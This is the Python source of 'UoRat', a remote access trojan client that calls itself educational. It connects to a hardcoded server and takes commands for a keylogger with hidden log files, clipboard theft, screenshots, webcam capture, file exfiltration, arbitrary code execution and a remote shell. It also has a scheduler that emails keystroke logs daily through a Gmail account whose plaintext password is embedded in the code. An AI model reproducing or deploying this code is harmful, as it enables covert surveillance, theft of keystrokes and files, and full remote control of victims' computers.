"""

+-----------------------------------------------------------------------+
|                               UoRat                                   |
|    Author: 27016005                                                   |
|    Version: 1.0.0           Deployment                                |
|    Last update: 29-04-2021 (dd-mm-yyyy)                               |
|                                                                       |
|                 [   ONLY FOR EDUCATIONAL PURPOSES   ]                 |
+-----------------------------------------------------------------------+

"""
import datetime                                 # Scheduler
import os                                       # running commands
import platform                                 # System information
import threading

import cv2
import schedule                                 # Scheduler
import smtplib                                  # Emailer
import socket                                   # Socket Connection
import subprocess                               # Running commands
import sys                                      # System Information
import time                                     # Sleep
from pprint import pprint                       # Pretty Printing & Output
from zipfile import ZipFile                     # Zipping Archives for file transfer

from mss import mss
from pynput.keyboard import Controller, Key, Listener     # Keylogger
import pyperclip




class Client:
# ''' SET UP CONNECTION '''
    def __init__(self, server_ip, port, buffer_size, client_ip):
        self.sscount = 0
        self.SERVER_IP = server_ip
        self.PORT = port
        self.BUFFER_SIZE = buffer_size
        self.CLIENT_IP = client_ip
        self.recvcounter = 0
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.FinalSwitcher = {
            "-msgbox": self.MSGBOX,
            "-shutdown": self.shutdown,
            "-shutdownM": self.shutdownmessage,
            "-lock": self.locksystem,
            "-restart": self.restart,
            "-EpIV": self.playstarwars,
            "-chess": self.playchess,
            "-weather": self.weather,
            "-telnet": self.enableTN,
            "-KLstart": self.enableKeyLogger,
            "-KLend": self.disableKeyLogger,
            "-getLogs": self.keylogs,
            "-getcb": self.clipboardgrab,
            "-Fsend": self.filesend,
            "-Frecv": self.filerecv,
            "-ginfo": self.sendHostInfo,
            "-exe": self.exePy,
            "-ss": self.screenshot,
            "-shell": self.fakeshell,
            "-loop": self.endless,
            "-email": self.email,
            "-dailymail": self.startEmailthread,
            "-endmailer": self.stopEmailThread,
            "-drop": self.drop,
            "-disc": self.disc,
            "-WCrec": self.capture,
            #"-WCSend": self.sendwebcam
        }
        self.Keylogger = type(Keylogger)
    def label(self):
        print('''UUUUUUUU     UUUUUUUU                RRRRRRRRRRRRRRRRR                  AAA         TTTTTTTTTTTTTTTTTTTTTTT
U::::::U     U::::::U                R::::::::::::::::R                A:::A        T:::::::::::::::::::::T
U::::::U     U::::::U                R::::::RRRRRR:::::R              A:::::A       T:::::::::::::::::::::T
UU:::::U     U:::::UU                RR:::::R     R:::::R            A:::::::A      T:::::TT:::::::TT:::::T
 U:::::U     U:::::U   ooooooooooo     R::::R     R:::::R           A:::::::::A     TTTTTT  T:::::T  TTTTTT
 U:::::D     D:::::U oo:::::::::::oo   R::::R     R:::::R          A:::::A:::::A            T:::::T        
 U:::::D     D:::::Uo:::::::::::::::o  R::::RRRRRR:::::R          A:::::A A:::::A           T:::::T        
 U:::::D     D:::::Uo:::::ooooo:::::o  R:::::::::::::RR          A:::::A   A:::::A          T:::::T        
 U:::::D     D:::::Uo::::o     o::::o  R::::RRRRRR:::::R        A:::::A     A:::::A         T:::::T        
 U:::::D     D:::::Uo::::o     o::::o  R::::R     R:::::R      A:::::AAAAAAAAA:::::A        T:::::T        
 U:::::D     D:::::Uo::::o     o::::o  R::::R     R:::::R     A:::::::::::::::::::::A       T:::::T        
 U::::::U   U::::::Uo::::o     o::::o  R::::R     R:::::R    A:::::AAAAAAAAAAAAA:::::A      T:::::T        
 U:::::::UUU:::::::Uo:::::ooooo:::::oRR:::::R     R:::::R   A:::::A             A:::::A   TT:::::::TT      
  UU:::::::::::::UU o:::::::::::::::oR::::::R     R:::::R  A:::::A               A:::::A  T:::::::::T      
    UU:::::::::UU    oo:::::::::::oo R::::::R     R:::::R A:::::A                 A:::::A T:::::::::T      
      UUUUUUUUU        ooooooooooo   RRRRRRRR     RRRRRRRAAAAAAA                   AAAAAAATTTTTTTTTTT 

27016005
''')
    def disc(self):
        sys.exit()

    def drop(self):
        global run
        run = False
        sys.exit()

    def connectToServer(self):
        self.client.connect((self.SERVER_IP, self.PORT))

    def confirmconnection(self):
        gendkey = self.client.recv(self.BUFFER_SIZE).decode('utf-8')
        # print(gendkey)
        acceptancecode = input("Enter the Given Key: ")

        if acceptancecode != gendkey:
            # todo
            print("Pairing Failed")
            self.client.send("MISMATCH".encode("utf-8"))
            self.client.close()
            sys.exit()

        else:
            print("KEYS MATCHED - PAIRING SUCCESSFUL")
            self.client.send("MATCH".encode("utf-8"))

    # try to update buffer size
    def updateBuffer(self, size):
        buff = ""
        for counter in range(0, len(size)):
            if size[counter].isdigit():
                buff += size[counter]

        return int(buff)

    # for big files
    def saveBigFile(self, size, buff):
        full = b''
        while True:
            if sys.getsizeof(full) >= size:
                break
            recvfile = self.client.recv(buff)

            full += recvfile
        return full

    def sendHostInfo(self):
        """ Extracting host information """

        host = sys.platform
        self.client.send(host.encode("utf-8"))
        # Make a Dictionary
        sys_info = {
            "Platform": platform.system(),
            "Platform Release": platform.release(),
            "Platform Version": platform.version(),
            "Platform Architecture": platform.architecture(),
            "Machine Type": platform.machine(),
            "Platform Node": platform.node(),
            "Platform Information": platform.platform(),
            "ALL": platform.uname(),
            "HostName": socket.gethostname(),
            "Host IP_Address": socket.gethostbyname(socket.gethostname()),
            "CPU": platform.processor(),
            "Python Build": platform.python_build(),
            "Python Compiler": platform.python_compiler(),
            "Python Version": platform.python_version(),
            "Windows Platform": platform.win32_ver()
            #  "OS": os.uname() # os.uname() ONLY SUPPORTED ON LINUX
        }
        cpu = platform.processor()
        system = platform.system()
        machine = platform.machine()

        with open('./logs/info.txt', 'w+') as f:
            for k, v in sys_info.items():
                f.write(str(k) + ' >>> ' + str(v) + '\n\n')

        with open('./logs/info.txt', 'rb+') as f:
            self.client.send(f.read())
        print("CPU: " + cpu + '\n', "System: " + system + '\n', "Machine: " + machine + '\n')
        # input()
        pprint(sys_info)
        # input()
        self.sysinfViaCMDFile()

    def sysinfViaCMDFile(self):
        # traverse the info
        Id = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
        new = []

        # arrange the string into clear info
        for item in Id:
            new.append(str(item.split("\r")[:-1]))
        with open("./logs/moreinfoC.txt", "w+") as f:
            for i in new:
                print(i[2:-2])
                f.write(i[2:-2] + "\n")
        with open('./logs/moreinfoC.txt', 'rb+') as f:
            # self.client.send(os.path.getsize('./logs/moreinfoC.txt').encode('utf-8'))
            c = f.read()
            print(len(c))
            time.sleep(1)
            self.client.send((str(len(c))).encode('utf-8'))
            time.sleep(1)
            self.client.send(c)

    # ''' WINDOWS FUNCTIONS '''
    def locksystem(self):
        msg = "rundll32.exe user32.dll, LockWorkStation"
        self.runrun(msg)
        self.client.send("[+] PC Locked".encode("utf-8"))

    def shutdown(self):
        #msg = "shutdown /s"
        #self.runrun(msg)
        # self.client.send("[+] PC SHUTDOWN.".encode("utf-8"))
        self.locksystem()

    def shutdownmessage(self):
        message = self.client.recv(self.BUFFER_SIZE).decode('utf-8')
        msg = "shutdown /s /e '" + message + "' "
        # msg = "shutdown /s /e 'You've been hacked '"
        self.runrun(msg)
        self.client.send(("[+] PC SHUTDOWN WITH MESSAGE." + msg).encode("utf-8"))

    def restart(self):
        msg = "shutdown /r"
        self.runrun(msg)
        self.client.send("[+] PC RESTARTED.".encode("utf-8"))

# ''' TELNET FUNCTIONS '''
    def enableTN(self):
        msg = "start /B start cmd.exe @cmd /c pkgmgr /iu:TelnetClient "
        self.runrun(msg)
        self.client.send("SUCCESS".encode("utf-8"))
        #self.client.send("[+] Telnet Client Enabled".encode("utf-8"))

    def playchess(self):
        msg = "start /B start cmd.exe @cmd /c telnet freechess.org "
        self.runrun(msg)
        self.client.send("SUCCESS".encode("utf-8"))
        # self.client.send("[+] Target is now playing Chess".encode("utf-8"))
        # chess_true = subprocess.check_call("start /B start cmd.exe @cmd /k telnet freechess.org ", shell=True)

    def playstarwars(self):
        msg = "start /B start cmd.exe @cmd /c telnet towel.blinkenlights.nl "
        self.runrun(msg)
        self.client.send("SUCCESS".encode("utf-8"))
        # self.client.send("[+] Target is now Watching Star Wars Ep.IV: A New Hope".encode("utf-8"))
        # Sw = subprocess.check_call("start /B start cmd.exe @cmd /c telnet towel.blinkenlights.nl ", shell=True)

    def weather(self):
        msg = "start /B start cmd.exe @cmd /c telnet rainmaker.wunderground.com "
        self.runrun(msg)
        self.client.send("SUCCESS".encode("utf-8"))
        # self.client.send("[+] Target is now checking the Weather".encode("utf-8"))
        # weather = subprocess.check_call("start /B start cmd.exe @cmd /c telnet rainmaker.wunderground.com ", shell=True)

# ''' KEYLOGGER FUNCTIONS '''
    def enableKeyLogger(self):
        # """ start thread for key logger """
        self.Keylogger = Keylogger()
        kThread = threading.Thread(target=self.Keylogger.log)
        kThread.start()
        self.client.send("*** SUCCESSFULLY STARTED LOGGER ***".encode('utf-8'))

    def disableKeyLogger(self):
        keyboard = Controller()
        keyboard.press(Key.esc)
        keyboard.release(Key.esc)
        print("KEYLOGGER KILLED")
        self.client.send("*** KEY LOGGER KILLED ***".encode('utf-8'))

    def keylogs(self):
            try:
                archname = './logs/files.zip'
                archive = ZipFile(archname, 'w')

                archive.write('./logs/readable.txt')
                archive.write('./logs/keycodes.txt')

                archive.close()
                self.client.send("[OK]".encode("utf-8"))
                time.sleep(0.1)

                # send size
                arcsize = os.path.getsize(archname)
                self.client.send(str(arcsize).encode("utf-8"))

                # send archive
                with open('./logs/files.zip', 'rb') as to_send:
                    self.client.send(to_send.read())

                os.remove(archname)

            except:
                self.client.send("[ERROR]".encode("utf-8"))

    def clipboardgrab(self):
        self.client.send(getClipBoard().encode('utf-8'))

# ''' CMD Functions '''
    def runprocess(self, msg):
        obj = subprocess.Popen(msg, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                               shell=True)
        output = (obj.stdout.read() + obj.stderr.read()).decode("utf-8", errors="ignore")
        print("A")
        if output == "" or output == "\n":
            print("B")
            self.client.send("[*] Done".encode("utf-8"))
        else:
            print("C")
            self.client.send(output.encode("utf-8"))

    def runrun(self, msg):
        obj = "failed"
        try:
            obj, _ = subprocess.run(msg, check=True, shell=True)
            # output = (obj.stdout.read() + obj.stderr.read()).decode("utf-8", errors="ignore")
        except Exception as e:
            print(".")
            # print("This failed too (runrun) : " + str(e) + " + " + str(obj))

    def MSGBOX(self):
        insert = self.client.recv(self.BUFFER_SIZE).decode('utf-8')
        try :
            msgA = '(echo MsgBox "' + insert + '" ^& vbCrLf ^& "Line 2",262192, "Title")> File.vbs'
            self.runrun(msgA)
            msgB = 'start File.vbs'
            self.runrun(msgB)
            self.client.send("[+] Message displayed and closed.".encode("utf-8"))
        except:
            self.client.send("[!] FAILED TO DISPLAY MESSAGE. ".encode("utf-8"))
        time.sleep(1)
        os.remove("File.vbs")

    def txtmsg(self):
        print("[!] TextMessageMode: Activated")
        message = self.client.recv(self.BUFFER_SIZE).decode('utf-8')
        print("Server:", message)
        # self.send(output.encode('utf-8'))
        time.sleep(2)
        self.client.send("[+] Message displayed and closed.".encode("utf-8"))

    def filesend(self):
        print("[!] FILE SEND MODE: Enabled")
        filePath = self.client.recv(self.BUFFER_SIZE).decode("utf-8")
        filelist = os.listdir(filePath)
        self.client.send("[*] Success".encode("utf-8"))
        # create a zip archive
        archname = './logs/files.zip'
        archive = ZipFile(archname, 'w')
        for file in filelist:
            archive.write(filePath + '/' + file)
        archive.close()
        # send size
        archivesize = os.path.getsize(archname)
        self.client.send(str(archivesize).encode("utf-8"))
        # send archive
        with open('./logs/files.zip', 'rb') as to_send:
            self.client.send(to_send.read())
            print("Should have worked.")
        # os.remove(archname)

    def filerecv(self):
        # obtain the name to save the file as, and the expected size
        filename = self.client.recv(self.BUFFER_SIZE).decode('utf-8')
        filesize = self.client.recv(self.BUFFER_SIZE).decode('utf-8')

        # if the size is bigger than regular buffer, adjust -> "SaveBigFile"
        if int(filesize) >= self.BUFFER_SIZE:
            buff = self.updateBuffer(filesize)
            TFile = self.saveBigFile(int(filesize), buff)
        else:
            TFile = self.client.recv(self.BUFFER_SIZE)

        with open(f"./logs/{filename}", "wb+") as targetfile:
            targetfile.write(TFile)

    def fakeshell(self):
        """ Shell """

        print("[!] SHELL MODE ENABLED: ")
        msg = (self.client.recv(self.BUFFER_SIZE).decode("utf-8"))
        if "cd" in msg.lower():
            try:
                d = msg[3:].strip()
                os.chdir(d)
                self.client.send("[*] Done".encode("utf-8"))
            except:
                self.client.send("[*] Dir not found / something went wrong.".encode("utf-8"))
        else:
            # subprocess.checkoutput
            self.runprocess(msg)
            # self.runrun(msg)

    def email(self):
        filename = self.client.recv(self.BUFFER_SIZE).decode('utf-8')
        status = emailsendfilepath(filename)
        self.client.send(status.encode('utf-8'))

    def endless(self):
        global run
        malorgood = input("Enter 1 to run in malicious mode or 2 to run in virtuous mode: ")
        if malorgood == "1":
            print("[-] Malicious mode enabled: ")
            self.client.send("1".encode("utf-8"))
        else:
            print("[-] Virtuous mode enabled: ")
            self.client.send("2".encode("utf-8"))
            self.confirmconnection()
        #self.startEmailthread()
        self.label()
        while run:
            print("entered loop")
            msg = (self.client.recv(self.BUFFER_SIZE).decode("utf-8"))
            print("[@] message received {msg} = "+str(msg))
            try:
                func = self.FinalSwitcher.get(msg)
                func()
            except TypeError:
                print("[!*!] This operation does not exist. ")
            except Exception as e:
                print("Even I don't know how you got this error - so I'll lock the pc. " + str(e))

                print("Server: msg = " + msg)
                self.client.send("[+] Message displayed and closed.".encode("utf-8"))

    def exePy(self):
        path2script = self.client.recv(self.BUFFER_SIZE).decode('utf-8')
        try:
            if ".py" in path2script:
                exec(open(path2script).read())
            elif ".exe" in path2script:
                try:
                    os.startfile(path2script)
                except Exception as ex:
                    print(".exe? " + str(ex))
                    pass
            else:
                try:
                    msg = "cmd /c " + path2script
                    self.runrun(msg)
                except Exception as sc:
                    print(".script? " + str(sc))
                    pass
            self.client.send("[*] SUCCESS".encode('utf-8'))

        except Exception as e:
            self.client.send(("[!!] FAILURE + " + str(e)).encode('utf-8'))

    def hidefile(self, filepath):
        command = "attrib +h "+filepath+""
        self.runrun(command)

# '''SCREENSHOT'''
    def screenshot(self):
        with mss() as ss:
            #ss.shot(mon=1, output='./logs/screen{}.png'.format(self.sscount))
            ss.shot(output='./logs/screen{}.png'.format(self.sscount))  # taking screenshot
            picsize = os.path.getsize('./logs/screen{}.png'.format(self.sscount))
            self.client.send(str(picsize).encode('utf-8'))
            time.sleep(0.1)
            with open('./logs/screen{}.png'.format(self.sscount), 'rb') as screen:
                tosend = screen.read()
                self.client.send(tosend)  # sending actual file
            # os.remove('./logs/screen{}.png'.format(self.screenshot_counter))  # removing file from host
            self.sscount += 1
        print("[*] SUCCESS")

    def capture(self):
        counter = 0
        vc = cv2.VideoCapture(0)
        if vc.isOpened():  # try to get the first frame
            rval, frame = vc.read()
            cv2.imwrite('./logs/Video/video{}.png'.format(counter), frame)
            counter += 1
        else:
            rval = False
        fr = 50
        while fr > 0:  # rval:
            fr -= 1
            if len(str(counter)) < 4:
                spacer = "0" * (4 - int((len(str(counter)))))
            cv2.imwrite('./logs/Video/video{}{}.png'.format(spacer, counter), frame)
            counter += 1
            rval, frame = vc.read()
            cv2.waitKey(int(1000 / 24))
        vc.release()
        self.sendwebcam()

    def sendwebcam(self):
        print("FILE SEND MODE: Enabled")
        filePath = 'logs/Video'
        print(str(filePath))
        filelist = os.listdir(filePath)
        pprint(filelist)
        self.client.send("Success".encode("utf-8"))
        # create a zip archive
        print("Success sent")
        archname = './logs/webcam.zip'
        archive = ZipFile(archname, 'w')
        for file in filelist:
            archive.write(filePath + '/' + file)
            print(str(file))
        archive.close()

        # send size
        archivesize = os.path.getsize(archname)
        print(archivesize)
        self.client.send((str(archivesize)).encode("utf-8"))
        print("Sending")
        time.sleep(1)
        print("NOW")
        # send archive
        with open('./logs/webcam.zip', 'rb') as to_send:
            self.client.send(to_send.read())
            print("Should have worked.")


    def startEmailthread(self):
        global eThreadActive
        eThreadActive = True
        eThread = threading.Thread(target=Scheduler)
        eThread.start()
        self.client.send("[*] Success".encode('utf-8'))

    def stopEmailThread(self):
        global eThreadActive
        eThreadActive = False
        self.client.send("*** Email Thread Killed ***".encode('utf-8'))
# ''' STATIC METHODS '''
def getClipBoard():
    cb = pyperclip.paste()  # getting the clipboard

    if len(cb) == 0:
        contents = "/No Clipboard contents/"
    else:
        contents = cb
    print(contents)
    return contents


# ''' EMAILER FUNCTIONS '''
def emailsendbody(body):
    # creates SMTP session
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.ehlo()

    # start TLS for security
    s.starttls()

    # Authentication
    s.login("uor.27016005@gmail.com", "C0mput3rSc13nc3")

    # message to be sent
    message = "Subject:{0}\n\n{1}".format(datetime.datetime.now().strftime("%d-%m-%y %H:%M:%S"), body)
    print(message)

    # sending the mail
    s.sendmail("uor.27016005@gmail.com", "dannyb0903@gmail.com", message)

    # terminating the session
    s.quit()


def emailsendfilepath(filepath):
        if os.path.exists(filepath):
            with open(filepath, 'r') as file:
                body = file.read()
                emailsendbody(body)
                return "OK"
        else:
            return "[!!] FILE DOESNT EXIST"

Ethread = False
run = True
def Scheduler():
    # SCHEDULER
    schedule.every().day.at("20:05").do(emailsendfilepath, "./logs/readable.txt")
    global eThreadActive
    while eThreadActive:
        schedule.run_pending()
        time.sleep(1)
        print(" - Emailthread - ")

class Keylogger:
    def __init__(self):
        # Dictionary containing all the keys
        # which may not produce a visible output in the log,
        # but still need recording
        self.modifier_keys = {
            "Key.enter": '\n',
            "Key.space": ' ',
            "Key.shift_l": '',
            "Key.shift_r": '',
            "Key.tab": "[TAB]",
            "Key.backspace": "[BACKSPACE]",
            "Key.caps_lock": "[CAPSLOCK]",
            "Key.ctrl": "[CTRL]",
            r"'\x03'":  "\n[COPIED TO CLIPBOARD] \n",
            r"'\x16'": "\n[Pasted: " + getClipBoard() + "]\n"
        }
        self.standardkey = True

        # Make a folder to store the logs,
        # if the folder already exists continue
        try:
            os.mkdir('./logs')
        except FileExistsError:
            pass

    # When a key is pressed on keyboard
    def key_press(self, key):
        # ESCAPE CLAUSE
        if key == Key.esc:
            print("ESCAPED: ")
            input()
            return False

        with open('./logs/readable.txt', 'a+') as log, open('./logs/keycodes.txt', 'a+') as codes:
            # key codes
            # This produces an output unreadable to humans
            print("added code: " + str(key))
            codes.write(str(key) + '\n')

            # readable keys
            for keycode in self.modifier_keys:
                # print("key = " + str(key) + " code = " + keycode)
                if keycode == str(key):
                    self.standardkey = False
                    log.write(self.modifier_keys[keycode])

                    break
            if self.standardkey:
                log.write(str(key).replace("'", ""))
            self.standardkey = True

    def log(self):
        self.hidelogs()
        with Listener(on_press=self.key_press) as listener:
            listener.join()  # listening for keystrokes

    def hidelogs(self):
        """ Hiding key-logger logs """
        command = "attrib +h ./logs/readable.txt"
        subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
        time.sleep(1)
        command = "attrib +h ./logs/keycodes.txt"
        subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)


def main():
    SERVER_IP = "192.168.56.1"  # modify me
    #  SERVER_IP = "82.13.30.90"
    PORT = 1337  # modify me (if you want)
    BUFFER_SIZE = 2048
    safemode = bool(True)
    global eThreadActive
    global run
    run = True
    eThreadActive = False
    try:
        os.mkdir('./logs')
    except FileExistsError:
        pass

    CLIENT = socket.gethostname()
    CLIENT_IP = socket.gethostbyname(CLIENT)
    print(CLIENT_IP)

    while run:
        try:
            client = Client(SERVER_IP, PORT, BUFFER_SIZE, CLIENT_IP)
            client.connectToServer()
            client.endless()
        except:
            pass

if __name__ == "__main__":
    main()